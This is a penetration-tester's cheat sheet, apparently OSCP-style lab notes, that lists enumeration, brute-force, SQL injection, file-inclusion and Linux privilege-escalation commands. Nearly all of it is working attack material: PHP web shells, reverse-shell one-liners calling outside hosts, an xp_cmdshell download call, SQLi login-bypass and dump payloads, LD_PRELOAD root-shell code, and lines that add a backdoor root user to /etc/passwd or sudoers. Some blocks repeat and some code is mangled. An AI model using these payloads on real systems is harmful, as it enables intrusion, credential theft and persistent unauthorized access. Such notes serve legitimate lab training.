# Red Team Notes

# **Enumeration Commands**

## **Ping IP and Check TTL**

- **`nmap -p- ip -T5 --open`**
- **`nmap -p(ports here) -sC -sV ip -o nmap`** (add **`sU`** to scan UDP ports if unsatisfied with output)

## **Script Scan**

- **`nmap -sV --script=vulscan/vulscan.nse`**

## **Port Specific NSE Scripts**

- **`ls /usr/share/nmap/scripts/ssh*`**
- **`ls /usr/share/nmap/scripts/smb*`**

## **FTP**

- Anonymous login: user and pass = **`anonymous`**File Upload command: **`put shell.php`**

## **TELNET**

- Check if telnet is enabled or try: **`telnet ip 21`** (21 is the port)
- **`site cpfr path`** (works only if path and file are valid)
- **`site cpto path`**

## **SSH**

- **`id_rsa.pub`**: Public key used in authorized keys dir for login
- **`id_rsa`**: Private key for direct login or bruteforce using **`ssh2john`** and crack with **`john`** or **`hashcat`**
- **`ssh -i id_rsa user@ip`**
- Passwordless login: add **`id_rsa.pub`** to authorized keys directory**`o StrictHostKeyChecking=no`** to avoid host key errors

## **MYSQL**

- **`nmap -sV -Pn -vv 10.0.0.1 -p 3306 --script mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysqlinfo,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122`**

## **SMB (139 & 445)**

- **`nmap --script smb-protocols ip`**
- **`ls -l /usr/share/nmap/scripts/smb*`** (list all SMB scripts)
- **`net view \\dc01 /all`** (Windows)

### **Enumerating SMB Shares**

- **`crackmapexec smb ip`**
- **`crackmapexec smb ip --shares`**
- **`crackmapexec smb ip -u '' -p ''`**
- **`enum4linux -a ip`** (Look for shares, find password from clues)
- **`smbmap -H ip`**
- **`smbmap -H ip -u 'user' -p 'pass'`**
- **`smbmap -H ip -u '' -p ''`**
- **`smbmap -H ip -u ''`**
- **`smbmap -H ip -s share_name`**
- **`smbclient -L //ip`**
- **`smbclient -L //ip/`**
- **`smbclient //ip/sharename`**
- **`smbclient -L //ip -N`** (No password, SMB Null session)
- **`smbclient --no-pass -L ip`** (no pass)
- **`smbclient -p 4455 -L //192.168.50.63/ -U hr_admin --password=Welcome1234`**(Use **`U`** to access specific user shares)Recurse on - toggles recursionPrompt off - doesn't prompt to download (y/n)

# **File Operations in SMB**

- **`mget *`** (downloads all files)
- **`gpp-decrypt "hash"`**

# **Easy Way to Download All Files in SMB Server**

- Recurse ON
- Prompt OFF
- **`mget *`**

# **RPC (Remote Procedure Call)**

- **`rpcclient -U "" 10.10.10.10`**
- **`rpcclient -U '' 10.10.10.10`**

### **RPC Commands**

- **`enumdomusers`**
- **`enumdomgroups`**
- **`enumprivs`**
- **`queryuser [rid]`**
- **`getdompwinfo`**
- **`getusrdompwinfo [rid]`**

### User Enumeration Commands

- **`queryusergroups rid`**
- **`querygroup rid`**

# **SNMP (Simple Network Management Protocol)**

- **`community.txt`** (public, private, manager)
- **`onesixtyone -c community -i ips`**
- **`snmpwalk -c public -v1 -t 10 192.168.148.151`** (To enumerate MIB Tree)

### **SNMP MIB Tree Enumeration**

- **`1.3.6.1.2.1.25.1.6.0`** System Processes
- **`1.3.6.1.2.1.25.4.2.1.2`** Running Programs
- **`1.3.6.1.2.1.25.4.2.1.4`** Processes Path
- **`1.3.6.1.2.1.25.2.3.1.4`** Storage Units
- **`1.3.6.1.2.1.25.6.3.1.2`** Software Name
- **`1.3.6.1.4.1.77.1.2.25`** User Accounts
- **`1.3.6.1.2.1.6.13.1.3`** TCP Local Ports

### **Additional SNMP Commands**

- **`snmpwalk -c public -v 1 192.168.225.149 NET-SNMP-EXTEND-MIB::nsExtendObjects`**
- **`snmpwalk -c public -v 1 192.168.225.149 hrSWRunParameters`**
- **`snmp-check 192.168.120.94`**

# **NFS (Network File System)**

- **`showmount -e 10.1.1.27`**
- **`mkdir /mount/nfs`**
- **`mount -t nfs ip:/pathshown /mnt/nfs`**
- Permission Denied? [Refer Blog](https://blog.christophetd.fr/write-up-vulnix/)

# **POP3**

- **`nc ip port`**
- **`USER "username"`**
- **`PASS "password"`**
- **`LIST`**
- **`RETR 1`**
- **`RETR 2`**

# **SMTP**

- **`nc ip port`**
- **`VRFY root`**
- **`VRFY user`**
- **`Test-NetConnection -Port 25 192.168.50.8`** (Windows)

# **Exploiting Port 3389 (RDP - Remote Desktop Protocol)**

- [Exploit 1](https://www.exploit-db.com/exploits/47519)
- [Exploit 2](https://github.com/whokilleddb/CVE-2019-17662)

# **Bruteforce and Hash Cracking**

## **CEWL (Custom Word List Generator)**

- **`cewl -d 2 -m 5 -w docswords.txt url`**
    - **`d`**: depth
    - **`m`**: minimum word length
    - **`w`**: output file
    - **`-lowercase`**: lowercase all parsed words (optional)

## **Hashcat**

- [Hashcat Example Hashes](https://hashcat.net/wiki/doku.php?id=example_hashes)
- [HashID Types](https://mattw.io/hashID/types) (HashID match)
- **`hashcat -m "number" hash.txt rockyou.txt`**

## **John the Ripper**

- **`john hash.txt --wordlist=~/rockyou.txt`**

## **Online Tools**

- [CrackStation](https://crackstation.net/)
    - Supports LM, NTLM, md2, md4, md5, md5(md5_hex), md5-half, sha1, sha224, sha256, sha384, sha512, ripeMD160, whirlpool, MySQL 4.1+ (sha1(sha1_bin)), QubesV3.1BackupDefaults
- [dCode](https://www.dcode.fr/tools-list)
    - Supports MD4, MD5, RC4 Cipher, RSA Cipher, SHA-1, SHA-256, SHA-512, XOR Cipher
- [MD5 Decrypt](https://www.md5online.org/md5-decrypt.html)
- [MD5 Online](https://md5.gromweb.com/)

## **Protocol Bruteforce**

### **Hydra**

- Supports TELNET, FTP, HTTP, HTTPS, HTTP-PROXY, SMB, SMBNT, MS-SQL, MYSQL, REXEC, irc, RSH, RLOGIN, CVS, SNMP, SMTP, SOCKS5, VNC, POP3, IMAP, NNTP, PCNFS, XMPP, ICQ, SAP/R3, LDAP2, LDAP3, Postgres, Teamspeak, Cisco auth, Cisco enable, AFP, Subversion/SVN, Firebird, LDAP2, Cisco AAA
- **`hydra -L users.txt -P pass.txt 192.168.0.114 ssh`** (use **`l`** if you know the username)

### **Medusa**

- Supports AFP, CVS, FTP, HTTP, IMAP, MS-SQL, MySQL, NetWare NCP, NNTP, PcAnywhere, POP3, PostgreSQL, REXEC, RLOGIN, RSH, SMBNT, SMTP-AUTH, SMTP-VRFY, SNMP, SSHv2, Subversion (SVN), Telnet, VMware Authentication Daemon (vmauthd), VNC, Generic Wrapper, Web Form
- **`medusa -u qiu -P rockyou.txt -T 5 192.168.0.116 -p smb`**

### **Ncrack**

- Fastest bruteforce tool
- Supports RDP, SSH, http(s), SMB, pop3(s), VNC, FTP, telnet
- SSH Example: **`ncrack -v -U user.txt -P pass.txt ssh://10.10.10.10:<port> -T5`**

## **Additional Hydra Examples**

- **`hydra -L users.txt -P rockyou.txt 10.10.10.10 http-post-form "/login.php:user=^USER^&pass=^PASS^:Invalid Username or Password" -V -s 7654`** (identify exact parameters in the request)
- **`hydra -l admin -P ~/rockyou.txt -f 192.168.143.201 http-get /`** (Basic Auth)
- **`hydra -l kali -P usernames.txt ssh://ip`** (use **`l -p`** if you know username and password, else bruteforce using **`L -P`**)
- **`hydra -L /usr/share/wordlists/dirb/others/names.txt -p "SuperS3cure1337#" rdp://192.168.50.202`**

## **HTTP Form Post**

```bash
hydra 10.0.2.22 http-form-post "/kzMb5nVYJw/index.php:key=^PASS^:invalid key" -l x -P ~/rockyou.txt -t 10 -w 30
```

- Bruteforces a single parameter to gain access.

## **POP3 Bruteforce**

```bash
hydra -l natalya -P /usr/share/wordlists/fasttrack.txt -f 192.168.1.10 -s 55007 pop3
```

- POP3 bruteforce with a valid username (**`natalya`**).

## **Telnet Bruteforce**

```bash
hydra -l james -P passwords.txt 10.2.2.23 telnet
```

- Telnet bruteforce with the username **`james`**.

## **MySQL Bruteforce**

```bash
hydra -l root -P ~/rockyou.txt sunset-midnight mysql -t 4
```

- MySQL bruteforce with the username **`root`**.

## HTTP Form Post Bruteforce:

```bash
hydra 10.0.2.22 http-form-post "/kzMb5nVYJw/index.php:key=^PASS^:invalid key" -l x -P ~/rockyou.txt -t 10 -w 30
```

- Bruteforces a single parameter to gain access.

## POP3 Bruteforce with Valid Username:

```bash
hydra -l natalya -P /usr/share/wordlists/fasttrack.txt -f 192.168.1.10 -s 55007 pop3
```

- POP3 bruteforce with the valid username **`natalya`**.

## Telnet Bruteforce:

```bash
hydra -l james -P passwords.txt 10.2.2.23 telnet
```

- Telnet bruteforce with the username **`james`**.

## MySQL Bruteforce:

```bash
hydra -l root -P ~/rockyou.txt sunset-midnight mysql -t 4
```

- MySQL bruteforce with the username **`root`**.

# **Directory Enumeration for Ports 80 and 443**

## **dirsearch**

```bash
dirsearch -u url
```

## **ffuf**

```bash
ffuf -c -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u url -mc -e txt,php,csv,md,json,js,html,py,sh -fs 80
```

## **gobuster**

```bash
gobuster dir -w /usr/share/seclists/Discovery/Web_Content/common.txt -t 80 -u http://
gobuster dir -w /usr/share/seclists/Discovery/Web_Content/common.txt -t 100 -x txt,php,csv,md,json,js,html,py,sh,pdf,config -u url
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,php,csv,md,json,js,html,py,sh,pdf,config -t 100 -u url
gobuster dir -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -t 100 -x txt,php,csv,md,json,js,html,py,sh,pdf -u url -k
```

**Note:** For ffuf, use **`-H "Authorization: Basic YWRtaW46YWRtaW4="`** for header if needed.

# **WordPress Enumeration**

## **wpscan**

```bash
wpscan --url http://10.10.10.10 -e u,vp # enumerate users & vulnerable plugins
wpscan --url 10.10.10 --passwords rockyou.txt --usernames elliot
```

# **Username Enumeration via BruteForce**

- [WordPress Brute Force Script](https://github.com/SecurityCompass/wordpress-scripts/blob/master/wp_login_user_enumeration.py)

```bash
python wp_brute.py url -t
```

**Note:** Try to create **`shell.php`** with PHP reverse shell payload in themes or plugins and try to open it with listening **`nc`** in Kali (Need write permission). Use **`php-reverse-shell.php`** or generate it with **`msfvenom`**.

# **To Analyze the Response of Request**

```bash
curl http://ip
```

# **WAF Bypass**

```bash
curl http://192.168.120.149:13337/logs -H "X-Forwarded-For: localhost"
```

# **Username Registration**

```php
<?php system($_POST["cmd"]);?>
```

This script allows running arbitrary commands via a POST request.

# API: **Creating a Pattern for GoBuster Bruteforce**

To create a pattern for bruteforcing using GoBuster on an API, follow these steps:

1. Specify the API endpoints with placeholders:
    - **`{GOBUSTER}/v1`**
    - **`{GOBUSTER}/v2`**
2. Use the **`gobuster`** command with the following parameters:
    - **`u http://192.168.229.143`**: Target URL
    - **`w /usr/share/wordlists/dirb/big.txt`**: Wordlist for bruteforce
    - **`p pattern`**: Specify the pattern for endpoints

Here's the command:

```bash
gobuster dir -u http://192.168.229.143 -w /usr/share/wordlists/dirb/big.txt -p pattern
```

# **WordPress**

- To enumerate vulnerabilities, users, and plugins in WordPress:
    
    ```bash
    wpscan --url "http://10.0.2.19/wordpress" -e at,ap,u
    ```
    
- If the username is **`admin`**, try default credentials:
    
    ```bash
    wpscan --url "http://10.0.2.19/wordpress" -U admin -P ~/rockyou.txt
    ```
    
    **Note:** This might consume a lot of time and should be considered as a last option. Try to identify the password through any leakage, hints, or enumeration.
    

# **Remote Code Execution (RCE)**

- If you have RCE and the reverse shell payload is not working, try encoding it in base64:
    
    ```bash
    echo "payload" | base64
    ```
    
- In the vulnerable parameter, use the following command to decode and execute the payload:
    
    ```bash
    echo "b64 encoded payload" | base64 -d | bash
    ```
    

# **Checking for UNC Paths - `\\IP\FILE` in Parameters**

# **Millhouse Web App**

- Register a user with the name **`<?php system($_POST["cmd"]);?>`**
- Exploit: [Millhouse Web App Exploit](https://www.exploit-db.com/exploits/47121)
    - Login once and record the REQUEST using Burp Suite.
    - Modify the login request to continue the exploitation.
    - Use LFI to include the session path such as **`/var/lib/php/sessions/sess_<my session>`**.
    - Write the command you want to execute, for example, a reverse shell, in POST variability.
    - Example: **`&cmd=nc 8.8.8.8 4444 -e /bin/bash`**
- Now, you have a shell, and you can find **`local.txt`** in **`/var/www`**.

# **Privilege Escalation (PE)**

- Execute **`sudo -l`** to check for available sudo privileges.

# **SQLi**

For comprehensive information on SQL injection, please refer to the [PortSwigger SQL Injection Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet).

## **SQL Injection Payloads**

```sql
'
)'
"
`
')
")
`)
'))
"))
`))
'-SLEEP(30); #
```

### **Login Bypass Examples**

- Both user and password or specific username and payload as password:
    - **`' or 1=1 --`**
- User bypass with specific conditions:
    - **`' or '1'='1`**
    - **`' or 1=1 --+`**
    - **`user' or 1=1;#`**
    - **`' and 1=1#`**
    - **`user' or 1=1 LIMIT 1;#`**
    - **`user' or 1=1 LIMIT 0,1;#`**
    - **`offsec' OR 1=1 -- //`**
- Advanced examples:
    - **`' or 1=1 in (select @@version) -- //`**
    - **`' OR 1=1 in (SELECT * FROM users) -- //`**
    
    **Note:** If a query accepts only one column, use **`' or 1=1 in (SELECT password FROM users) -- //`**. To retrieve a specific user password, use **`' or 1=1 in (SELECT password FROM users WHERE username = 'admin') -- //`**.
    

### **Boolean-Based Blind SQL Injection**

- Example:
    - **`http://192.168.50.16/blindsqli.php?user=offsec' AND 1=1 -- //`**

### **Time-Based Blind SQL Injection**

- Example:
    - **`http://192.168.50.16/blindsqli.php?user=offsec' AND IF (1=1, sleep(3),'false') -- //`**

**Note:** When testing for blind SQL injection, don't always expect 5xx when the statement is wrong. Look for results if the statement is correct; if the statement is wrong, results may not be present.

### **Union-Based SQL Injection**

- Example to identify the name of databases:
    - **`' union SELECT schema_name,null,null,null FROM information_schema.schemata--`**
- Example to identify tables in a particular database:
    - **`' union SELECT TABLE_NAME,null,null,null FROM information_schema.TABLES WHERE table_schema='Staff'--`**
- Example to identify column names of a particular table:

### **Union-Based SQL Injection for Dumping Data**

```sql
' union SELECT column_name,null,null,null FROM information_schema.columns WHERE table_name = 'StaffDetails'--
```

### **Dumping Data**

```sql
' union SELECT group_concat(Username,":",Password),null,null,null FROM users.UserDetails--
```

**Note:** Use the last database name and table name in the query. Otherwise, use the database name at last; it's usually sufficient.

### **Making Dumped Data Readable**

```bash
cat userPass | tr "," "\n" > userPass
cut -d ":" -f1 userPass | tee -a user
cut -d ":" -f2 userPass | tee -a pass
```

### **Crack Passwords Using CrackStation**

1. Prepare the data:
    
    ```bash
    cat pass | curl -s --data-binary @- https://crackstation.net/api/v1/crack -H "Content-Type:text/plain" > cracked_pass.txt
    ```
    
2. Analyze the results in **`cracked_pass.txt`**.

### **Remote Code Execution (RCE) Examples**

### MySQL

```sql
' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- //
```

- Make sure the output directory (**`/var/www/html/tmp/`**) is writable to the OS user.
- Access the webshell: **`/tmp/webshell.php?cmd=id`**

### MSSQL

1. Set up an HTTP server:
    
    ```bash
    python -m http.server 8080
    ```
    
2. Execute the following SQL injection payload:
    
    ```sql
    '; exec master..xp_cmdshell 'powershell -c Invoke-WebRequest "http://kaliip:8080/p" -Method HEAD'--
    ```
    
    - Adjust the payload as needed.
    - Monitor hits on your server (**`kaliip:8080/p`**).
    
    ## **Local File Inclusion (LFI)**
    
    - Determine the minimum number of correct escapes (../) required to retrieve a file:
        - **`/usr/share/seclists/Fuzzing/LFI`**
    - When fuzzing with **`ffuf`**, include the admin session cookie and grep for **`passwd`**:
        - Example: **`http://ip.com/test.php?Fuzz=/etc/passwd`**
        - Example: **`http://ip.com/test.php?file=fuzz (pathotest.txt)`**
    
    ### **Read /etc/passwd & Check Port 22 Open?**
    
    - For Linux, try hydra brute force for those usernames.
    
    ### **Port Knocking**
    
    - Attempt port knocking by reading the knock file.
    
    ### **Samba Enumeration**
    
    - Look for the following Samba-related files:
        - **`/export/samba/secure/smbpasswd.bak`**
        - **`/etc/samba/smb.conf`**
    
    ### **Assertion Payloads and Other Tricks**
    
    For various tricks and assertion payloads, refer to:
    
    - [HackTricks - File Inclusion](https://book.hacktricks.xyz/pentesting-web/file-inclusion)
    
    ### **Bypass Techniques**
    
    - URL Encoding
    - PHP Filters:
        - **`php://filter/resource=admin.php`** (Checking whether PHP wrappers are working)
        - **`php://filter/convert.base64-encode/resource=admin.php`**
        - **`data://text/plain,<?php%20echo%20system('ls');?>`** (Direct RCE if log poisoning didn't work)
    - Base64 Encoding:
        - **`echo -n '<?php echo system($_GET["cmd"]);?>' | base64`**
        - **`data:text/plain,<?php echo shell_exec("bash /tmp/reverse.sh");?>`**
        - **`data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"`**
    - Separate users from **`/etc/passwd`**:
        
        ```bash
        cut -d ":" -f1 sshUsers2
        ```
        
    - [LFI to RCE Tool](https://github.com/takabaya-shi/LFI2RCE) (https://github.com/takabaya-shi/LFI2RCE)

## **Log Poisoning**

1. Attempt to read the access log file:
    - Linux: **`/var/log/apache2/access.log`**
    - Windows: **`C:\xampp\apache\logs\access.log`**
2. If successful, log poisoning may be possible.
3. Add the following payload in the User-Agent field using Burp Suite:
    
    ```php
    <?php echo system($_GET['cmd']); ?>
    ```
    
4. Achieve Remote Code Execution (RCE) via **`&cmd=`**:
    
    ```bash
    bash -c "bash -i >& /dev/tcp/192.168.119.3/4444 0>&1"
    ```
    

**Note:** Not always can LFI be used directly for obtaining a reverse shell using log poisoning or via RFI.

If the server is running on Tomcat, attempt to traverse to **`tomcat-users.xml`** to obtain credentials and then login to **`/manager/html`** to deploy a war file for shell.

### **Tomcat Paths**

- **`/etc/tomcat7`**
- **`/usr/share/tomcat7`**
- **`/usr/share/tomcat7-root`**
- **`/var/lib/tomcat7/conf`**
- **`/tmp/tomcat7-tomcat7-tmp`**

### **Attempt to Obtain SSH Private Keys**

- **`/home/user/.ssh/id_rsa`**
- **`/home/user/.ssh/id_ecdsa`**

```bash
chmod 600 id_rsa
ssh -i id_rsa user@ip
```

### **Windows Log Poisoning Paths**

- **`C:\Program%20Files\FileZilla%20Server\FileZilla%20Server.xml`**
- **`..\..\..\..\..\..\..\..\xampp\security\webdav.htpasswd`**
- **`..\..\..\..\..\..\..\..\xampp\htdocs\blog\wp-config.php`**

## **Remote File Inclusion (RFI)**

1. Host **`php-reverse-shell.php`** using a Python server.
    
    ```bash
    python -m http.server
    ```
    
2. Enter the URL in a parameter after listening to netcat.
3. Achieve shell access.

## File Upload

## **Using Executable Files**

1. Access webshells in the directory:
    - **`/usr/share/webshells/`** (Contains various webshells)
2. Reference [HackTricks - File Upload](https://book.hacktricks.xyz/pentesting-web/file-upload) for additional information.
3. **Filter Bypass:**
    - Use different file extensions to bypass filters (e.g., **`.pHP`**, **`.phps`**, **`.phtml`**, **`.php7`**).
    - Note: Check with Curl.

## **Using Non-Executable Files**

### **Leveraging Directory Traversal**

1. **Overwriting Files (Weak Permissions):**
    - Generate SSH keys: **`ssh-keygen`**
    - Overwrite **`authorized_keys`** with a public key:
        
        ```bash
        cat file.pub > authorized_keys
        chmod a+rwx authorized_keys
        chmod 700 id_rsa
        ```
        
    - Try to overwrite **`/../../../../../../../root/.ssh/authorized_keys`** (ensure the uploaded file name in the request follows this pattern).
    - Connect via SSH: **`ssh -i id_rsa user@ip`**
2. **Upload File using CURL:**
    
    ```bash
    curl --user 'user:pass' -T file.exe url
    ```
    

## **Command Injection**

If a single command is working, try URL encoding a semi-colon. For example, if **`git`** command works but others are restricted:

```bash
git;ipconfig
```

Use URL encoding for special characters. For Linux, use **`;`** or **`&&`**, and for Windows, use **`&`**.

### **Determine Webshell Type (PowerShell or CMD)**

```bash
(dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell
```

If parameters are passed in the body, try encoding them. For example, for Linux:

```bash
param=";ls" (as URL encoded)
```

Always check the "forgot email password" page for anything suspicious in the response.

### **CMD.php in Website for Executing Commands in POST Data**

```bash
ip=127.0.0.1%0awget IP%0amv index.html webshell.php%0a&send=Ping+It%21
```

```bash
curl http://127.0.0.1:8080/start_page.php?page=cmd.php --data "cmd=echo 'www-data ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers"
```

```bash
echo+'os.execute("nc+-e+/bin/sh+192.168.XX.XX+445")'+>+/var/tmp/shell.nse+&&+sud
```

## **Linux Privilege Escalation**

1. Check **`.bash_history`** for historical commands.
2. Inspect environment variables with **`env`**.
3. Review **`.bashrc`** for any modifications.
4. Identify the current user with **`whoami`**.
5. Get user and group information with **`id`**.
6. Check sudo permissions with **`sudo -l`** (look for potential GTFO Bins).
    - If no suitable sudo files are found, try creating one in the same path, e.g., **`derpy.sh`** with content **`chmod +s /bin/bash`**, and then run **`sudo ./derpy.sh && /bin/bash -p`**.
7. Identify how a file is getting called: **`grep -r "/home/oscp/ip" /etc/`**.
8. Examine **`/etc/group`** and **`getent group "groupname"`**.
9. View **`/etc/passwd`** for user information.
10. Check **`/etc/shadow`** for user password information.
11. Display routing information with **`route`** and **`routel`**.
12. Inspect firewall rules with **`cat /etc/iptables/rules.v4`**.

### **Process Enumeration**

- Watch processes using **`watch -n 1 "ps -aux | grep pass"`**.
- Monitor network traffic with **`sudo tcpdump -i lo -A | grep "pass"`**.
- Find processes with a specific command using **`ps -u -C passwd`**.

### **Break Restricted Bash via SSH**

```bash
ssh username@192.168.1.104 -t "bash --noprofile"
```

### **OS Enumeration**

- Check OS details:
    - **`cat /etc/issue`**
    - **`cat /etc/*-release`**
    - **`cat /proc/version`**
    - **`uname -a`**
    - **`arch`**
    - **`ldd --version`**

### **Tools Installed**

Check if essential tools are installed:

```bash
which awk perl python ruby gcc cc vi vim nmap find netcat nc wget tftp ftp 2>/dev/null
```

### **File Owners & Permissions**

- List files with details: **`ls -la`**
- Display all files and child files in the current directory: **`find . -ls`**
- Check command history: **`history`** and **`cat ~/.bash_history`**
- Find readable files for a user: **`find / -type f -user <username> -readable 2> /dev/null`**
- List writable files by the user: **`find / -writable -type d 2>/dev/null`**
- List writable directories: **`find / -writable 2>/dev/null | cut -d "/" -f 2 | sort -u`**
- Identify world-writable directories: **`find / -perm -0002 -type d -print 2> /dev/null`**
- Locate a specific file: **`find / -name "test.py" 2>/dev/null`**
- Search for writable directories in **`/usr/local/`**: **`find /usr/local/ -type d -writable`**

If a file is owned by root but the directory is owned by a regular user, replace the contents using **`echo "content" > rootownedfile`**.

## **Kernel Exploits**

### **Compilation of Exploits**

- Check kernel details:
    - **`uname -a`**
    - **`cat /proc/version`**
    - **`cat /etc/lsb-release`**
    - **`cat /etc/os-release`**
- Compile exploits using GCC or CC:
    - **`gcc exp.c -o exp.sh`** (or **`exp.exe`** for Windows)
    - Add flags like **`w`**, **`static`**, **`pthread`** if needed.

### **Searching for Exploits**

- Use **`searchsploit`**:
    
    ```bash
    searchsploit "name with version"
    ```
    
- Example Exploits:
    - [Dirty Cow](https://raw.githubusercontent.com/firefart/dirtycow/master/dirty.c)
    - [Overlayfs](https://www.exploit-db.com/exploits/37292)
    - [Linux Kernel < 4.4.0-116](https://www.exploit-db.com/exploits/44298)

### **SUDO -L and GTFO Bins**

- Check sudo permissions: **`sudo -L`**
- Utilize GTFO Bins.
- Look for environment variables, e.g., **`LD_PRELOAD`** or **`LD_LIBRARY_PATH`**.

### **Exploiting LD_PRELOAD**

- Create **`env.c`**:
    
    ```c
    #include <stdio.h>#include <sys/types.h>#include <stdlib.h>void _init() {
        unsetenv("LD_PRELOAD");
        setresuid(0,0,0);
        system("/bin/bash -p");
    }
    ```
    
- Compile and execute:
    
    ```bash
    gcc -fPIC -shared -o /tmp/env env.c -nostartfiles
    sudo LD_PRELOAD=/tmp/env program-name-here
    ```
    

### **Exploiting LD_LIBRARY_PATH**

- Create **`library_path.c`**:
    
    ```c
    #include <stdio.h>
    #include <stdlib.h>
    static void hijack() __attribute__((constructor));
    void hijack() {
        unsetenv("LD_LIBRARY_PATH");
        setresuid(0,0,0);
        system("/bin/bash -p");
    }
    ```
    
- Compile and execute:
    
    ```bash
    bashCopy code
    gcc -o /tmp/lib.so -shared -fPIC library_path.c
    sudo LD_LIBRARY_PATH=/tmp binaryname
    
    ```
    

### **SUID Enumeration**

- Find SUID binaries:
    
    ```bash
    bashCopy code
    find / -perm -u=s -type f 2>/dev/null
    
    ```
    
- Check for binary versions and look for exploits or shared object injection.

## **Exploiting Vulnerabilities**

### **Bash Version < 4.2-048**

```bash
/bin/bash --version ( < 4.2-048)
function "that absolute path" { /bin/bash -p; }
export -f "that absolute path"
call the suid binary ( for doubts THM linprivesc tasks)
```

### **Bash Version < 4.4**

```bash
bash --version ( < 4.4)
env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)' "that absolute path"
/tmp/rootbash -p
```

### **Capabilities**

```bash
getcap -r / 2>/dev/null
# Example: Granting read/search capability to tar
tar cf file.tar "path we want"
```

### **Service Exploits**

- Find a service run by root.
- Replace the executable if it's writable with a payload or **`chmod +s /bin/bash`**.
- If the directory is owned by the user, replacing the file is possible.

### **Cron Jobs**

```bash
cat /etc/crontab
grep "CRON" /var/log/syslog
# Modify cron jobs or replace scripts to execute privileged commands.
```

### **LXD Group**

```bash
# Example steps for exploiting LXD group
# Clone and build Alpine image
git clone https://github.com/saghul/lxd-alpine-builder.git
cd lxd-alpine-builder
sudo ./build-alpine

# Transfer the .tar.gz file to the target
# Import the image and create an LXD container
/snap/bin/lxc image import ./alpine-v3.18-x86_64-20230718_0359.tar.gz --alias myimage
/snap/bin/lxc init myimage ignite -c security.privileged=true
/snap/bin/lxc storage create pool dir
/snap/bin/lxc profile device add default root disk path=/ pool=pool
/snap/bin/lxc storage list
/snap/bin/lxc init myimage ignite -c security.privileged=true
/snap/bin/lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
/snap/bin/lxc start ignite
/snap/bin/lxc exec ignite /bin/sh
cd /mnt/root/root
```

### **Writable Cron Directory**

Refer to [https://cheatsheet.haax.fr/linux-systems/privilege-escalation/crontab/#writable-cron-directory](https://cheatsheet.haax.fr/linux-systems/privilege-escalation/crontab/#writable-cron-directory)

### **User Password Changing Script**

- Check for scripts that change passwords and run as root.
- Use **`\\x0A\\x0Aroot:NewPass`** to set the root password to **`NewPass`** when adding users.

### **PATH**

```bash
# Check current PATH
echo $PATH

# Modify PATH
echo "chmod +s /bin/bash" >> ~/.bashrc
```

## **Exporting Current Path and Running Executable**

```bash
export PATH=.:$PATH # setting as current path
chmod 777 ps
./rootownedfilee
```

## **NFS Exploitation**

```bash
cat /etc/exports # Look for no_root_squash or no_all_squash
showmount -e targetip
mkdir /tmp/mount
mount -o rw targetip:/backups /tmp/mount
# or
mount -t nfs ip:/var/backups /tmp/mount # use targetip:/ to mount all shares if multiple were available

# Using msfvenom to create a payload
msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/mount/shell.elf
chmod +xs /tmp/mount/shell.elf
ls -l /tmp/mount/shell.elf
./shell.elf

# Alternative using a simple executable
gcc nfs.c -static -w -o nfs
# or
# put bash suid there
```

## **MooseFS Exploitation**

```bash
mkdir -p /mnt/folder
mfsmount /mnt/folder -H ip

# Check for .ssh folder
# If present, generate SSH key pair and move .pub to /mnt/folder/.ssh/authorized_keys
ssh-keygen
mv ~/.ssh/id_rsa.pub /mnt/folder/.ssh/authorized_keys

# Try to identify username and SSH using key
ssh -i id_rsa user@ip
# or
# Try the above NFS method
```

## **Finding Hidden Files and DIRTYCOW Exploitation**

```bash
# Look for hidden files
ls -la /var/backups

# Check everything including processes, internal ports, and config files
# Config files may contain passwords

# Look for root private SSH keys
find / -name authorized_keys 2> /dev/null
find / -name id_rsa 2> /dev/null
# Copy/paste contents to Kali
chmod 600 id_rsa
ssh -i id_rsa root@ip # Crack the password using John

# DIRTYCOW exploit
# Exploit in ~/stuffs/oscp/c0w.c
gcc c0w -w -pthread -o cow
./cow
/usr/bin/passwd
```

## **Writing to Shadow/Passwd File**

```bash
echo "root2::0:0:root:/root:/bin/bash" >> /etc/passwd # Setting no password for user root2 to login as root
# or
openssl passwd banana
# replace x with hash or create a correct format
echo "root2:$1$ORXgPu49$zUxuMoaybWABa2bhFnIpz0:0:0:root:/root:/bin/bash" >> /etc/passwd
su root2 # Enter the password

# Setting SUID for /bin/bash (if chmod can be run as root)
/usr/bin/chmod +s /bin/bash
# Try to reboot the machine
/bin/bash -p
```

## **Escalation Methods**

```bash
# Copy /bin/bash to /tmp/rootbash and set SUID
cp /bin/bash /tmp/rootbash
chmod +xs /tmp/rootbash
/tmp/rootbash -p

# Modify /etc/sudoers
nano /etc/sudoers
# Add the following line to allow the user to run any command without a password
user ALL=(ALL) NOPASSWD:ALL

# Modify /etc/passwd to change GID to root
nano /etc/passwd
# Change GID of the user to root
echo "exploit:YZE7YPhZJyUks:0:0:root:/root:/bin/bash" >> /etc/passwd
su - exploit

# Change root password using chpasswd
echo root:gl0b0 | /usr/sbin/chpasswd
```

## **SNMP Exploitation**

- Check if **`snmpd`** is running as root and **`/etc/snmp/snmpd.conf`** is writable.
- Refer to [https://rioru.github.io/pentest/web/2017/03/28/from-unauthenticated-to-root-supervision.html](https://rioru.github.io/pentest/web/2017/03/28/from-unauthenticated-to-root-supervision.html) for further details.